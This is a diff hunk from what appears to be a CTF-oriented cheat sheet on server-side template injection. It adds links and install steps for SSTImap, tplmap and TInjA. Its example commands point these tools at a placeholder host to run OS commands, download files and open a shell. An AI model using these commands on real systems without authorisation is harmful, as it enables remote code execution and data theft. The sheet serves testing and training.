@@ -783,17 +783,30 @@ Odd code-context gadget from the old sheet:
 
 SSTImap is the maintained Python 3 successor/spin-off of tplmap. Use it to identify the template engine and quickly check whether the injection supports OS command execution, file read/write, template-code execution, blind extraction, or shell modes. It is useful after manual confirmation, but it is noisy.
 
+Links:
+
+```text
+SSTImap: https://github.com/vladko312/SSTImap
+tplmap: https://github.com/epinna/tplmap
+TInjA: https://github.com/Hackmanit/TInjA
+```
+
 ```bash
 # SSTImap
+git clone https://github.com/vladko312/SSTImap
+cd SSTImap
+python3 -m pip install -r requirements.txt
 python3 sstimap.py -u 'http://HOST/page?name=INJECT' -s
 python3 sstimap.py -i -u 'http://HOST/page?name=INJECT*' -l 5
 python3 sstimap.py -u 'http://HOST/page?name=INJECT' --os-cmd id
 python3 sstimap.py -u 'http://HOST/page?name=INJECT' --download /flag.txt flag.txt
 
 # tplmap, old but still useful in CTF boxes
+git clone https://github.com/epinna/tplmap
 python2.7 tplmap.py -u 'http://HOST/page?name=*' --os-shell
 
 # TInjA
+# Download a release from https://github.com/Hackmanit/TInjA/releases
 tinja url -u 'http://HOST/page?name=x'
 tinja url -u 'http://HOST/' -d 'name=x'
 ```
